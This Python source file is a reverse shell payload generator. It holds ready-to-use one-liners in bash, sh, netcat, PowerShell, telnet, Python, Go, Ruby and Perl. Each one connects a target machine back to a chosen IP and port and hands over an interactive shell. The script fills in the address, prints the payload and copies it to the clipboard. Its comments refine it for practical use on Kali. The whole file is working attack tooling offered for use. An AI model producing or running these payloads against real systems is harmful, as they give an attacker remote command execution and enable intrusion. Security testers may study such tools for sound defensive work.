#!/usr/bin/env python3
"""Generate a reverse shell one-liner and put it on the clipboard."""

import argparse
import shutil
import subprocess
import sys

# {ip} and {port} are substituted with str.replace, not str.format or an f-string, so
# the braces that PowerShell, Go and Perl payloads are full of need no escaping. The
# go payload used to be an f-string and died with "NameError: name 'c' is not defined"
# because its body looked like a replacement field.
PAYLOADS = {
    "bash": """bash -c 'bash -i &> /dev/tcp/{ip}/{port} 0>&1'""",

    "sh": """sh -c 'sh -i &> /dev/tcp/{ip}/{port} 0>&1'""",

    "nc": """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f""",

    # Needs a netcat built with -e (traditional, busybox). Kali's OpenBSD nc has no
    # such flag, and neither do most targets - reach for "nc" above first.
    "nc2": """nc -e /bin/sh {ip} {port}""",

    "powershell": """powershell -c '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'""",

    "telnet": """TF=$(mktemp -u); mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF""",

    # python3 first: a target with a bare "python" is getting rare.
    "python3": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""",

    "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""",

    "go": """package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}""",

    "ruby": """ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",

    "perl": """perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,IPPROTO_TCP);if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i <&S >&S 2>&S");}'""",
}

# pbcopy on macOS, wl-copy on Wayland, xclip or xsel on X11. Shelling out to whichever
# exists keeps this dependency-free: it used to import pyperclip, which is not in
# setup/install.sh and so was a ModuleNotFoundError on a fresh Kali - and even when
# installed it raises on a headless box with no clipboard tool behind it.
CLIPBOARDS = (
    ["pbcopy"],
    ["wl-copy"],
    ["xclip", "-selection", "clipboard", "-in"],
    ["xsel", "--clipboard", "--input"],
)


def generate_payload(language, ip, port):
    return PAYLOADS[language.lower()].replace("{ip}", ip).replace("{port}", str(port))


def copy_to_clipboard(text):
    """Returns (tool, None) on success, or (None, reason) explaining why not. Never
    raises - the payload is already on stdout by now, and a clipboard we cannot reach
    is not worth failing over."""
    tried = []
    for argv in CLIPBOARDS:
        if not shutil.which(argv[0]):
            continue
        tried.append(argv[0])
        try:
            # Swallow the tool's own noise: xclip on a headless box prints
            # "Error: Can't open display" before failing, and our own message says
            # it better.
            subprocess.run(argv, input=text.encode(), check=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return argv[0], None
        except (OSError, subprocess.CalledProcessError):
            continue
    if tried:
        # The usual cause is a headless session: xclip and xsel need an X display.
        return None, "%s installed but could not be reached (no display?)" % "/".join(tried)
    return None, "no clipboard tool installed (apt install xclip)"


def main():
    parser = argparse.ArgumentParser(
        description="Generate reverse shell payloads.",
        epilog="the payload goes to stdout on its own, so it pipes: "
               "%(prog)s bash 10.0.0.1 4444 | pbcopy")
    # Taken straight from PAYLOADS so the two can never drift again: the old list was
    # missing go, ruby and perl, which made those three unreachable.
    parser.add_argument("language", choices=sorted(PAYLOADS), help="payload language")
    parser.add_argument("ip", help="the IP address to connect back to")
    parser.add_argument("port", type=int, help="the port to connect back to")
    parser.add_argument("--no-copy", action="store_true", help="do not touch the clipboard")
    args = parser.parse_args()

    if not 1 <= args.port <= 65535:
        parser.error("port must be 1-65535")

    payload = generate_payload(args.language, args.ip, args.port)

    # Decoration on stderr, payload alone on stdout, so a pipe gets just the payload.
    print("\nGenerated payload:\n", file=sys.stderr)
    print(payload)
    sys.stdout.flush()

    if args.no_copy:
        return
    tool, why = copy_to_clipboard(payload)
    if tool:
        print("\n[copied with %s]\n" % tool, file=sys.stderr)
    else:
        print("\n[not copied: %s - the payload above is on stdout, so it pipes]\n" % why,
              file=sys.stderr)


if __name__ == "__main__":
    main()
